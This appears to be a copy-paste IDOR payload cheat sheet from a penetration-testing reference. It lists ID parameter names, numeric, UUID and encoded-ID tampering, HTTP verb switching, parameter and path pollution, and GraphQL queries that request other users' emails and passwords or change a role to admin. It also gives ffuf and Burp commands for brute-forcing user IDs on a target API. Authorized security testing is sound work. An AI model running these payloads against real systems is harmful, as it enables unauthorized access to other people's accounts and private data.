---
tags:
  - high
  - logic
  - access-control
---

# IDOR Payloads

Quick reference for Insecure Direct Object Reference testing. Copy-paste ready.

---

## Common Parameters

```
# User/Account
id=
user_id=
uid=
userId=
user=
account=
account_id=
accountId=
acct=
profile_id=
profileId=
member_id=
memberId=
customer_id=
customerId=

# Documents/Files
doc=
docId=
document_id=
file=
file_id=
fileId=
filename=
report_id=
reportId=
attachment_id=

# Orders/Transactions
order=
order_id=
orderId=
order_number=
orderNumber=
transaction_id=
transactionId=
invoice_id=
invoiceId=
receipt_id=
payment_id=
paymentId=

# Resources
resource_id=
object_id=
objectId=
item_id=
itemId=
record_id=
recordId=
ref=
reference=
key=
no=
number=
num=
pid=
pk=
```

---

## ID Manipulation

### Numeric IDs

```
# Original: id=1337
id=1338           # Increment
id=1336           # Decrement
id=1              # First record
id=0              # Zero
id=-1             # Negative
id=9999999        # Large number
id=2147483647     # Max INT32
id=9223372036854775807  # Max INT64

# Sequences
id=100,101,102
id=100-200
```

### Numeric Bypass

```
# Type confusion
id=1337          # Integer
id="1337"        # String
id=1337.0        # Float
id=1337e0        # Scientific
id=01337         # Octal prefix
id=0x539         # Hex (1337)

# Padding
id=001337
id=00001337

# Wrapped arrays
id[]=1337
id[0]=1337
{"id": [1337]}
{"id": {"$eq": 1337}}
```

---

## UUID/GUID Attacks

### Version Detection

```
# v1 (timestamp-based) - predictable!
550e8400-e29b-11d4-a716-446655440000
└─time─┘└───┘└ver┘└var┘└───node────┘

# v4 (random) - harder but test anyway
550e8400-e29b-41d4-a716-446655440000
```

### UUID Manipulation

```
# Original: 550e8400-e29b-41d4-a716-446655440000

# Nil UUID
00000000-0000-0000-0000-000000000000

# Max UUID
ffffffff-ffff-ffff-ffff-ffffffffffff

# Format variations
550e8400e29b41d4a716446655440000          # No dashes
{550e8400-e29b-41d4-a716-446655440000}    # Braces
urn:uuid:550e8400-e29b-41d4-a716-446655440000  # URN

# Case variations
550E8400-E29B-41D4-A716-446655440000      # Upper
550e8400-E29B-41d4-A716-446655440000      # Mixed

# Similar UUIDs (increment last byte)
550e8400-e29b-41d4-a716-446655440001
550e8400-e29b-41d4-a716-446655440002
```

### v1 UUID Timestamp Extraction

```python
# Extract timestamp from v1 UUID
import uuid
u = uuid.UUID('550e8400-e29b-11d4-a716-446655440000')
print(u.time)  # Nanoseconds since 1582
# Generate nearby UUIDs from same timeframe
```

### MongoDB ObjectID

```
# 24 hex chars, partially predictable
507f1f77bcf86cd799439011
└─time─┘└rand┘└─counter─┘

# Increment counter
507f1f77bcf86cd799439012
507f1f77bcf86cd799439013

# Same timestamp, different machine
507f1f77bcf86cd799439011
507f1f77aaa86cd799439011
```

---

## Encoded ID Attacks

### Base64

```
# Decode, modify, re-encode
echo "MTMzNw==" | base64 -d        # 1337
echo -n "1338" | base64            # MTMzOA==

# Common patterns
eyJ1c2VyX2lkIjoxMzM3fQ==         # {"user_id":1337}
dXNlcjoxMzM3                      # user:1337

# With URL encoding
MTMzNw%3D%3D
```

### Hashed IDs

```
# MD5 of sequential IDs
echo -n "1" | md5sum    # c4ca4238...
echo -n "2" | md5sum    # c81e728d...
echo -n "1337" | md5sum # e48e13207...

# SHA1
echo -n "1337" | sha1sum

# Common hash patterns
user_1337 → hash
1337:secret → hash
admin:1337 → hash
```

### Hashids/Sqids

```
# Short encoded IDs
# /user/jR → decode to 1337
# Try common salt values: "", "salt", app_name

# Hashids decoder
hashids = Hashids(salt="")
hashids.decode("jR")
```

### JWT Object IDs

```
# ID embedded in JWT payload
# Decode, modify sub/user_id, re-encode
# May need signature attack (see auth.md)

{"sub":"1337","role":"user"}
{"sub":"1","role":"admin"}
```

---

## HTTP Method Switching

```http
# Original: GET fails IDOR check
GET /api/user/1337/profile → 403

# Try other methods
POST /api/user/1337/profile → 200
PUT /api/user/1337/profile → 200
PATCH /api/user/1337/profile → 200
DELETE /api/user/1337/profile → 200

# Override headers
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method: DELETE
```

### Verb Tampering

```http
# IDOR check only on specific verb
GET /api/users/1337 → 403 (blocked)
HEAD /api/users/1337 → 200 (info leak)
OPTIONS /api/users/1337 → allowed methods

# Case variations
get /api/users/1337
GeT /api/users/1337
```

---

## Parameter Pollution

### HTTP Parameter Pollution

```
# Duplicate parameters
?id=1337&id=9999
?user_id=me&user_id=1337

# Array syntax
?id[]=1337&id[]=9999
?id=1337,9999

# Different sources (query + body)
GET /api/user?id=me
POST body: id=1337

# Cookie + parameter
Cookie: user_id=me
?user_id=1337
```

### JSON Pollution

```json
// Duplicate keys (last wins?)
{"user_id": 123, "user_id": 1337}

// Nested override
{"user": {"id": 1337}, "user_id": 123}

// Unicode variations
{"user_id": 123, "user\u005fid": 1337}
```

### Path Pollution

```
/api/users/me/../1337
/api/users/me/..;/1337
/api/users/me%2f..%2f1337
/api/users/me/./1337
```

---

## Array Injection

```json
// Single to array
{"id": 1337}
{"id": [1337, 9999]}
{"id": [1337]}

// Request all
{"id": [*]}
{"id": ["*"]}
{"user_ids": [1,2,3,4,5,6,7,8,9,10]}

// Wildcard
{"id": "*"}
{"id": "all"}
{"id": -1}
```

### Bulk Operations

```json
// Batch endpoints
POST /api/users/bulk
{"ids": [1, 2, 3, 1337, 9999]}

// GraphQL
query { users(ids: [1, 2, 1337]) { email } }
```

---

## GraphQL IDOR

```graphql
# Direct query
query { user(id: 1337) { email password } }

# Nested
query { 
  me { 
    organization { 
      users { id email } 
    } 
  } 
}

# Mutations
mutation { 
  updateUser(id: 1337, input: {role: "admin"}) { id } 
}

# Aliases (bypass rate limits)
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 1337) { email }
}
```

---

## Common Vulnerable Endpoints

```
# User data
GET /api/users/{id}
GET /api/users/{id}/profile
GET /api/users/{id}/settings
GET /api/account/{id}
GET /profile?id={id}
GET /user/{id}/avatar

# Documents
GET /api/documents/{id}
GET /api/files/{id}/download
GET /download?file_id={id}
GET /attachment/{id}
GET /invoice/{id}.pdf

# Orders/Transactions
GET /api/orders/{id}
GET /api/transactions/{id}
GET /receipt/{id}
GET /payment/{id}/status

# Messages/Notifications  
GET /api/messages/{id}
GET /inbox/{id}
GET /notifications/{id}

# Admin functions
GET /admin/users/{id}
DELETE /api/users/{id}
PUT /api/users/{id}/role
POST /api/users/{id}/reset-password

# Exports
GET /export/{id}
GET /report/{id}/download
GET /backup/{id}
```

---

## Bypass Techniques

### Reference Swapping

```
# Change reference type
/api/users/1337 → /api/users/admin
/api/users/me → /api/users/1337

# Email as ID
/api/users/victim@example.com
?email=victim@example.com

# Username as ID
/api/users/admin
?username=admin
```

### Chained IDOR

```
# Step 1: Get valid ID from leak
GET /api/users → {"users": [{"id": 1337}]}

# Step 2: Access that ID
GET /api/users/1337/private-data
```

### Wrap Around

```
# If ID validation uses signed int
id=2147483648   # Wraps to negative
id=-2147483648  # Wraps to 0
```

### Race Condition IDOR

```python
# Create resource, access before ownership set
# Parallel requests to claim same resource
import threading
threading.Thread(target=claim, args=(resource_id,)).start()
threading.Thread(target=access, args=(resource_id,)).start()
```

---

## Automation

### Burp Intruder

```
# Payload positions
GET /api/users/§1337§/profile
GET /api/users/§FUZZ§/profile

# Payloads: Numbers 1-10000
# Grep: sensitive fields (email, ssn, etc.)
```

### ffuf

```bash
# Numeric brute force
ffuf -u https://target.com/api/users/FUZZ/profile \
  -w <(seq 1 10000) -mc 200 -fc 403,404

# With headers
ffuf -u https://target.com/api/users/FUZZ \
  -H "Authorization: Bearer TOKEN" \
  -w ids.txt -mc 200
```

### Parameter Discovery

```bash
# Find ID parameters
cat requests.log | grep -oE "[a-z_]*id=" | sort -u
cat burp_export.xml | grep -oE "=[0-9]+" | sort -u
```

---

## Quick Checklist

- [ ] Test all ID parameters (numeric, UUID, encoded)
- [ ] Increment/decrement numeric IDs
- [ ] Try negative, zero, large numbers
- [ ] Decode Base64/hash patterns
- [ ] UUID nil, max, format variations
- [ ] Switch HTTP methods (GET↔POST↔PUT↔DELETE)
- [ ] Parameter pollution (duplicate params)
- [ ] Array injection `{"id": [1,2,3]}`
- [ ] JSON key pollution
- [ ] Path traversal in ID `/users/me/../1337`
- [ ] Replace `me`/`self` with victim ID
- [ ] Check bulk/batch endpoints
- [ ] GraphQL aliases for mass enumeration
- [ ] Verify on both read AND write operations

---

*See also: [Auth Bypasses](auth.md) | [Access Control](../methodology/access-control.md)*
